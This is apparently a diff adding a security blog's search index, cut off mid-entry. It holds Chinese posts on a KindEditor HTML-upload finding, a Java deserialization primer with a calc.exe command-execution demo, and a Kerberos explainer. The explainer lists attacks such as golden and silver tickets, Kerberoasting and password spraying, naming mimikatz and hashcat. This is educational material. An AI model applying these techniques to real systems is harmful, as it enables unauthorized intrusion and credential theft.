@@ -1,0 +1,657 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>KindEditor文件上传漏洞</title>
+      <link href="/archives/afb5413b.html"/>
+      <url>/archives/afb5413b.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本⽂章仅供学习交流使⽤，请勿将⽂中所描述内容⽤于违法犯罪⾏为。</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>对该网站进行目录爆破 发现 <strong>&#x2F;upload</strong> 响应为200，妨问该目录，发现是一个空白页面<br><img src="https://pic.888888.al/i/2023/08/15/115jqda.png" alt="0"></p><p>对该网站进行抓包，发现<strong>KindEditor</strong>字样，百度可知，KindEditor编辑器可执行html文件，在请求包中构造html文件，尝试上传。<br><img src="https://pic.888888.al/i/2023/08/15/11a6w9l.png" alt="1"></p><p>上传成功，并返回文件保存路径。<br><img src="https://pic.888888.al/i/2023/08/15/11b6vli.png" alt="2"></p><p>妨问该路径，html文件被执行。<br><img src="https://pic.888888.al/i/2023/08/15/11brvmy.png" alt="3"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JAVA反序列化漏洞基础</title>
+      <link href="/archives/5a428c68.html"/>
+      <url>/archives/5a428c68.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="JAVA反序列化漏洞基础"><a href="#JAVA反序列化漏洞基础" class="headerlink" title="JAVA反序列化漏洞基础"></a>JAVA反序列化漏洞基础</h1><h2 id="1-1-什么是序列化和反序列化"><a href="#1-1-什么是序列化和反序列化" class="headerlink" title="1.1 什么是序列化和反序列化"></a>1.1 什么是序列化和反序列化</h2><p>Java序列化是指把Java对象转换为字节序列的过程；</p><p>Java反序列化是指把字节序列恢复为Java对象的过程；<br><img src="https://pic.888888.al/i/2023/08/15/10xozk9.png" alt="0"></p><h2 id="1-2-为什么要序列化"><a href="#1-2-为什么要序列化" class="headerlink" title="1.2 为什么要序列化"></a>1.2 为什么要序列化</h2><p>对象不只是存储在内存中，它还需要在传输网络中进行传输，并且保存起来之后下次再加载出来，这时<br>候就需要序列化技术。</p><p>Java的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或<br>传输网络。而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久<br>化的目的。</p><h2 id="1-3-ObjectOutputStream-与-ObjectInputStream类"><a href="#1-3-ObjectOutputStream-与-ObjectInputStream类" class="headerlink" title="1.3 ObjectOutputStream 与 ObjectInputStream类"></a>1.3 ObjectOutputStream 与 ObjectInputStream类</h2><h3 id="1-3-1-ObjectOutputStream类"><a href="#1-3-1-ObjectOutputStream类" class="headerlink" title="1.3.1 ObjectOutputStream类"></a>1.3.1 ObjectOutputStream类</h3><p>java.io.ObjectOutputStream 类，将Java对象的原始数据类型写出到文件,实现对象的持久存储。<br>序列化操作<br>一个对象要想序列化，必须满足两个条件:</p><p><strong>▪</strong> 该类必须实现 java.io.Serializable 接口， Serializable 是一个标记接口，不实现此接口的类将不会<br>使任何状态序列化或反序列化，会抛出 NotSerializableException 。</p><p><strong>▪</strong> 该类的所有属性必须是可序列化的。如果有一个属性不需要可序列化的，则该属性必须注明是瞬态<br>的，使用transient 关键字修饰。</p><p>示例：</p><p>Employee.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable&#123;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="keyword">public</span> String address;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">int</span> age; <span class="comment">// transient瞬态修饰成员,不会被序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addressCheck</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Address check : &quot;</span> + name + <span class="string">&quot; -- &quot;</span> + address);</span><br><span class="line"><span class="comment">//此处省略tostring等方法</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SerializeDemo.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line">e.name = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">e.age = <span class="number">20</span>;</span><br><span class="line">e.address = <span class="string">&quot;shenzhen&quot;</span>;</span><br><span class="line"><span class="comment">// 1.创建序列化流</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line"><span class="comment">// 2.写出对象</span></span><br><span class="line">outputStream.writeObject(e);</span><br><span class="line"><span class="comment">// 3.释放资源</span></span><br><span class="line">outputStream.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将Employee对象写入到了employee.txt文件中</p><p>开头的 AC ED 00 05 为序列化内容的特征</p><h3 id="1-3-2-ObjectInputStream类"><a href="#1-3-2-ObjectInputStream类" class="headerlink" title="1.3.2 ObjectInputStream类"></a>1.3.2 ObjectInputStream类</h3><p>如果能找到一个对象的class文件，我们可以进行反序列化操作，调用 ObjectInputStream 读取对象的<br>方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializeDemo</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">// 1.创建反序列化流</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line"><span class="comment">// 2.使用ObjectInputStream中的readObject读取一个对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line"><span class="comment">// 3.释放资源</span></span><br><span class="line">inputStream.close();</span><br><span class="line">System.out.println(o);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果：</p><p>反序列化操作就是从二进制文件中提取对象</p><h2 id="1-4-反序列化漏洞的基本原理"><a href="#1-4-反序列化漏洞的基本原理" class="headerlink" title="1.4 反序列化漏洞的基本原理"></a>1.4 反序列化漏洞的基本原理</h2><p>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法被重写不当时产生漏洞</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demon</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="comment">//定义myObj对象</span></span><br><span class="line"><span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line"><span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>));</span><br><span class="line"><span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">os.writeObject(myObj);</span><br><span class="line">os.close();</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>));</span><br><span class="line"><span class="comment">//恢复对象</span></span><br><span class="line"><span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">System.out.println(objectFromDisk.name);</span><br><span class="line">ois.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//重写readObject()方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">ClassNotFoundException&#123;</span><br><span class="line"><span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">in.defaultReadObject();</span><br><span class="line"><span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处重写了readObject方法，执行了 Runtime.getRuntime().exec()</p><p>defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行方法</p><p>运行流程：</p><ol><li><p>myObj对象序列化进object文件</p></li><li><p>从object反序列化对象-&gt;调用readObject方法-&gt;执行Runtime.getRuntime().exec(“calc.exe”);</p></li></ol><h2 id="1-5-java类中serialVersionUID的作用"><a href="#1-5-java类中serialVersionUID的作用" class="headerlink" title="1.5 java类中serialVersionUID的作用"></a>1.5 java类中serialVersionUID的作用</h2><p>serialVersionUID适用于java序列化机制。简单来说，JAVA序列化的机制是通过 判断类的serialVersionUID来验证的版本一致的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较。如果相同说明是一致的，可以进行反序列化，否则会出现反序列化版本一致的异常，即是InvalidCastException。</p><h3 id="1-5-1-serialVersionUID有两种显示的生成方式："><a href="#1-5-1-serialVersionUID有两种显示的生成方式：" class="headerlink" title="1.5.1 serialVersionUID有两种显示的生成方式："></a>1.5.1 serialVersionUID有两种显示的生成方式：</h3><p>一是 默认的1L，比如：private static final long serialVersionUID &#x3D; 1L; </p><p>二是根据包名，类名，继承关系，非私有的方法和属性，以及参数，返回值等诸多因子计算得出的，极<br>度复杂生成的一个64位的哈希字段。基本上计算出来的这个值是唯一的。比如：private static final<br>long serialVersionUID &#x3D; xxxxL;</p><p>注意：显示声明serialVersionUID可以避免对象不一致</p><p>设置自动生存uid<br><img src="https://pic.888888.al/i/2023/08/15/10y4t8s.png" alt="1"><br><img src="https://pic.888888.al/i/2023/08/15/10y8gg8.png" alt="2"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JAVA反序列化漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JAVA反序列化漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Kerberos协议详解（转载）</title>
+      <link href="/archives/c0777afa.html"/>
+      <url>/archives/c0777afa.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>Kerberos协议 是一个专注于验证通信双方身份的网络协议，不同于其他网络安全协议的保证整个通信过程的传输安全，Kerberos侧重于通信前双方身份的认定工作，帮助客户端以及服务端验证是真正的自己并非他人，从而使得通信两端能够完全信任对方的身份，在一个不安全的网络中完成一次安全的身份认证继而进行安全的通信。</p><h1 id="二、什么是Kerberos协议"><a href="#二、什么是Kerberos协议" class="headerlink" title="二、什么是Kerberos协议"></a>二、什么是Kerberos协议</h1><p>Kerberos是一种计算机网络认证协议 ，其设计目标是通过密钥系统为网络中通信的客户机(Client)&#x2F;服务器(Server)应用程序提供严格的身份验证服务，确保通信双方身份的真实性和安全性。不同于其他网络服务，Kerberos协议中不是所有的客户端向想要访问的网络服务发起请求，他就能建立连接然后进行加密通信，而是在发起服务请求后必须先进行一系列的身份认证，包括客户端和服务端两方的双向认证，只有当通信双方都认证通过对方身份之后，才可以互相建立起连接，进行网络通信。即Kerberos协议的侧重在于认证通信双方的身份，客户端需要确认即将访问的网络服务就是自己所想要访问的服务而不是一个伪造的服务器，而服务端需要确认这个客户端是一个身份真实，安全可靠的客户端，而不是一个想要进行恶意网络攻击的用户。</p><h1 id="三、Kerberos协议角色组成"><a href="#三、Kerberos协议角色组成" class="headerlink" title="三、Kerberos协议角色组成"></a>三、Kerberos协议角色组成</h1><p>Kerberos协议中存在三个角色，分别是：</p><p> ●  客户端(Client)：发送请求的一方</p><p> ● 服务端(Server)：接收请求的一方</p><p> ● 密钥分发中心(Key distribution KDC)</p><p>密钥分发中心又分为两个部分，分别是：</p><p><font color=red>AS(Authentication Server)</font>：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT(票据授予票据)</p><p><font color=red>TGS(Ticket Granting ticket)</font>：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据(ticket)</p><p>Kerberos认证过程简化描述如下：</p><p>客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。<font color=red>所以整个流程可简化为两大步</font>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）客户端向KDC请求获取想要访问的目标服务的服务授予票据(Ticket)；</span><br><span class="line"></span><br><span class="line">（2）客户端拿着从KDC获取的服务授予票据(Ticket)访问相应的网络服务；</span><br></pre></td></tr></table></figure><p>简化认证流程图如下：</p><p><img src="https://pic.888888.al/i/2023/08/15/10jy4ac.png" alt="0"></p><h1 id="四、Kerberos认证流程"><a href="#四、Kerberos认证流程" class="headerlink" title="四、Kerberos认证流程"></a>四、Kerberos认证流程</h1><p>上面写了简化版的Kerberos认证流程，大致分为两步，虽然只有两步，但是其中还是存在一些问题的，就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 (1)KDC怎么知道你(客户端)就是真正的客户端？凭什么给你发放服务授予票据(Ticket)呢？</span><br><span class="line">2 (2)服务端怎么知道你带来的服务授予票据(ticket)就是一张真正的票据呢？</span><br></pre></td></tr></table></figure><p>到这里就需要我们细节性的描述一下整个Kerberos认证的过程了～</p><p>上面提到这个流程可以简化为两大步，但其实在第一步中共做了两件事，这两件事解决了上述问题中的问题1；然后第二步解决了问题2； 最终结束认证过程建立通信。</p><p>所以整个Kerberos认证流程可以细化为三个阶段也可以理解为三次通信！ 接下来从三个阶段三次通信的角度细说认证过程。</p><p>在具体描述整个认证流程之前，我们需要知道几个Kerberos认证的前提条件:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、 Kerberos协议他是一个“限权”的认证协议，Kerberos中会自带一个数据库，这个数据库会由创建Kerberos的运维人员提前在库中添加好整个系统中拥有使用Kerberos认证权限的用户和网络服务。在后续的认证中也是根据数据库中是否存在该用户和服务来判断该对象是否能够通过认证服务的；</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、 所有使用Kerberos协议的用户和网络服务，在他们添加进Kerberos系统中时，都会根据自己当前的密码(用户密码，人为对网络服务随机生成的密码)生成一把密钥存储在Kerberos数据库中，且Kerberos数据库也会同时保存用户的基本信息(例如: 用户名，用户IP地址等)和网络服务的基本信息(IP，Server Name)；</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、 Kerberos中存在的三个角色，只要是发生了两两之间的通信，那么都需要先进行身份认证；</span><br></pre></td></tr></table></figure><h2 id="第一次通信"><a href="#第一次通信" class="headerlink" title="第一次通信"></a>第一次通信</h2><p>为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据(Ticket)。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以第一次通信的目的为KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端，过程如下：<br><img src="https://pic.888888.al/i/2023/08/15/10k253f.png" alt="1"><br>1、 客户端用户向KDC以明文的方式发起请求，该次请求中携带了自己的用户名、主机IP、和当前时间戳；</p><p>2、 KDC当中的AS(Authentication Server)接收请求(AS是KDC中专门用来认证客户端身份的认证服务器)后去Kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；</p><p>3、 如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回给客户端，其中包含两部分内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 第一部分内容称为TGT，它叫做票据授予票据，客户端需要使用TGT去KDC中的TGS(票据授予中心)获取访问网络服务所需的Ticket(服务授予票据)，TGT中包含的内容有Kerberos数据库中存在的该客户端的Name、IP、当前时间戳、客户端即将访问的TGS的Name、TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(2) 第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而中断认证流程。</span><br></pre></td></tr></table></figure><p>至此，第一次通信完成！！！</p><h2 id="第二次通信"><a href="#第二次通信" class="headerlink" title="第二次通信"></a>第二次通信</h2><p>此时的客户端收到了来自KDC(其实是AS)的响应，并获取到了其中的两部分内容。客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。</p><p>首先它会根据时间戳判断该时间戳与自己发送请求时的时间的差值是否大于5分钟，如果大于5分钟则认为该AS是伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求，其次请求的目的是为了获取能够访问目标网络服务的服务授予票据(Ticket)。</p><p>在第二次通信请求中，客户端将携带三部分内容交给KDC中的TGS，第二次通信过程具体如下所述：</p><p><img src="https://pic.888888.al/i/2023/08/15/10kds19.png" alt="3"></p><p>客户端行为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、 客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名、IP、时间戳；</span><br><span class="line">2、 客户端将自己想要访问的Server服务以明文的方式发送给KDC；</span><br><span class="line">3、 客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；</span><br></pre></td></tr></table></figure><p>TGS行为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、 此时KDC中的TGS(票据授予服务器)收到了来自客户端的请求。它首先根据客户端明文传输过来的Server服务IP查看当前Kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束。如果存在，则继续接下来的认证。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、 TGS使用自己的密钥将TGT中的内容进行解密，此时它看到了经过AS认证过后并记录的用户信息，一把Session_Key即CT_SK，还有时间戳信息，他会根据时间戳判断此次通信是否真是可靠有无超出时延。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、 如果时延正常，则TGS会使用CK_SK对客户端的第一部分内容进行解密(使用CT_SK加密的客户端信息)，取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。</span><br></pre></td></tr></table></figure><p>4、 此时KDC将返回响应给客户端，响应内容包括：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 第一部分：用于客户端访问网络服务使用Server密码加密的ST(Server Ticket)，其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信的CS_SK(Session Key)。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(2) 第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。</span><br></pre></td></tr></table></figure><p>至此，第二次通信完成！！！</p><h2 id="第三次通信"><a href="#第三次通信" class="headerlink" title="第三次通信"></a>第三次通信</h2><p>此时的客户端收到了来自KDC(TGS)的响应，并使用缓存在本地的CT_SK解密了第二部分内容(第一部分内容中的ST是由Server密码加密的，客户端无法解密)，检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。<br><img src="https://pic.888888.al/i/2023/08/15/10khesl.png" alt="4"></p><p>客户端：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 客户端使用CK_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST(服务授予票据)作为第二部分内容都发送给服务端。</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 服务器此时收到了来自客户端的请求，它会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时它将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过KDC认证的具有真实身份的客户端，是它可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份(其实服务端在通信的过程中还会使用数字证书证明自己身份)。</span><br></pre></td></tr></table></figure><p>至此，第三次通信完成。此时也代表着整个Kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以进行整个网络的通信了。</p><p>将以上内容进行总结概述就是：整个Kerberos认证的过程较为复杂，三次通信中都使用了密钥，且密钥的种类一直在变化，并且为了防止网络拦截密钥，这些密钥都是临时生成的Session key，即它们只在一次Session会话中起作用，即使密钥被劫持，等到密钥被破解可能这次会话都早已结束。这为整个Kerberos认证过程保证了较高的安全性。</p><h1 id="五、Kerberos认证图谱"><a href="#五、Kerberos认证图谱" class="headerlink" title="五、Kerberos认证图谱"></a>五、Kerberos认证图谱</h1><h2 id="Kerberos认证整体流程图"><a href="#Kerberos认证整体流程图" class="headerlink" title="Kerberos认证整体流程图"></a>Kerberos认证整体流程图</h2><p><img src="https://pic.888888.al/i/2023/08/15/10lkygj.png" alt="5"></p><h2 id="Kerberos认证时序图"><a href="#Kerberos认证时序图" class="headerlink" title="Kerberos认证时序图"></a>Kerberos认证时序图</h2><p><img src="https://pic.888888.al/i/2023/08/15/10lrt2n.png" alt="6"></p><h1 id="六、Kerberos攻击方式"><a href="#六、Kerberos攻击方式" class="headerlink" title="六、Kerberos攻击方式"></a>六、Kerberos攻击方式</h1><p><img src="https://pic.888888.al/i/2023/08/15/10lx162.png" alt="7"></p><h2 id="1、AS-REQ阶段-三种手法"><a href="#1、AS-REQ阶段-三种手法" class="headerlink" title="1、AS_REQ阶段(三种手法)"></a>1、AS_REQ阶段(三种手法)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 哈希传递攻击(Pass The Hash)</span><br><span class="line">在AS_REQ阶段，捕获用户的密码Hash来做身份验证，获取TGT，横向访问其他主机。</span><br><span class="line"></span><br><span class="line">//使用场景：内网渗透中要横向移动，但获取不到明文口令。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(2) 域用户名枚举</span><br><span class="line">AS_REQ的cname值，当域用户不存在时，返回包提示错误</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(3) 密码喷洒攻击(Password Sparying)</span><br><span class="line">并且当用户名存在，密码正确和错误时，返回包也不一样，所以可以进行用户名密码爆破，是用固定的密码去跑用户名。</span><br></pre></td></tr></table></figure><p>域用户名枚举以及密码喷洒攻击和Web爆破原理类似，根据响应包返回码来判断是否爆破成功！如下图所示:<br><img src="https://pic.888888.al/i/2023/08/15/10ngm4v.png" alt="8"></p><h2 id="2、AS-REP阶段-两种手法"><a href="#2、AS-REP阶段-两种手法" class="headerlink" title="2、AS_REP阶段(两种手法)"></a>2、AS_REP阶段(两种手法)</h2><h3 id="1-黄金票据"><a href="#1-黄金票据" class="headerlink" title="(1) 黄金票据"></a>(1) 黄金票据</h3><p>针对黄金票据的攻击发生在这一阶段。因为TGT黄金票据是由krbtgt用户的Hash加密的，所以如果我们获取了这个Hash，就可以用Mimikatz伪造任意TGT(可自己制作一个TGT认购权证)。总共需要以下信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 要伪造的域用户(名称、Hash)，一般是域管理员;</span><br><span class="line">• 域名;</span><br><span class="line">• 域的SID;</span><br><span class="line">• krbtgt用户的Hash;</span><br></pre></td></tr></table></figure><p>黄金、白银票据主要为了维持权限，尤其是黄金票据，是后门的万能钥匙</p><p><strong>此类攻击方法被称为票据传递攻击(Pass The Ticket)</strong></p><h3 id="2-AS-REP-Roasting攻击"><a href="#2-AS-REP-Roasting攻击" class="headerlink" title="(2) AS_REP Roasting攻击"></a>(2) AS_REP Roasting攻击</h3><p>AS_REP阶段，最外层的enc-part是用用户密码Hash加密的。对于域用户，如果设置了选项 “Do not require Kerberos preauthentication” ,此时向域控器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户的Hash加密的Login Session Key，我们通过进行离线爆破就可以获得用户Hash)重新组合，能够拼接成 “Kerberos 5 AS_REP etype 23”(18200) 的格式，接下来可以使用hashcat对其破解。</p><h2 id="3、TGS-REQ-amp-TGS-REP阶段-五种手法"><a href="#3、TGS-REQ-amp-TGS-REP阶段-五种手法" class="headerlink" title="3、TGS_REQ&amp;TGS_REP阶段(五种手法)"></a>3、TGS_REQ&amp;TGS_REP阶段(五种手法)</h2><p><strong>TGS_REP阶段(两种手法)</strong></p><h3 id="1-Kerberoast攻击"><a href="#1-Kerberoast攻击" class="headerlink" title="(1) Kerberoast攻击"></a>(1) Kerberoast攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在TGS_REP阶段，由于enc-part是用服务密码Hash加密的，所以我们可以通过爆破获得服务的Hash。</span><br><span class="line">域上的任何经过身份验证的用户，只要TGT没问题，就能够从TGS处根据SPN请求ST，然后进行暴力破解。SPN格式：SERVICE/host.name。可以用Windows自带的SetSPN.exe查询SPN, 命令为setspn -Q */*。之后，可以用mimikatz指定服务目标、导出ST，用tgsrepcrack破解，相关工具有很多。</span><br></pre></td></tr></table></figure><h3 id="2-白银票据"><a href="#2-白银票据" class="headerlink" title="(2) 白银票据"></a>(2) 白银票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在TGS_REP阶段，TGS_REP里面的ticket的enc-part是使用服务的Hash进行加密的，如果我们拥有服务的Hash，就可以给我们自己签发任意用户的TGS票据，这个票据也称为白银票据。相较于黄金票据，白银票据使用要访问服务的Hash，而不是krbtgt的Hash，由于生成的是TGS票据，不需要跟域控打交道，但是白银票据只能访问特定服务。但是要注意一点的是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TGS生成的ST虽然只能访问特定的服务，但不依赖KDC，所以相比伪造黄金票据动静更小。ST用AP的Hash加密，如果获取了这个Hash，就可以伪造ST，进而跳过KDC的认证，直接和AP通信。</span><br></pre></td></tr></table></figure><p>总共需要以下信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域用户名称、Hash;</span><br><span class="line"></span><br><span class="line">域名;</span><br><span class="line"></span><br><span class="line">域的SID;</span><br><span class="line"></span><br><span class="line">目标AP的服务名、NTLM Hash等;</span><br></pre></td></tr></table></figure><p><strong>其实这也属于票据传递攻击！！!</strong></p><p>S4U阶段(三种手法)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">非约束委派攻击</span><br><span class="line">约束委派攻击</span><br><span 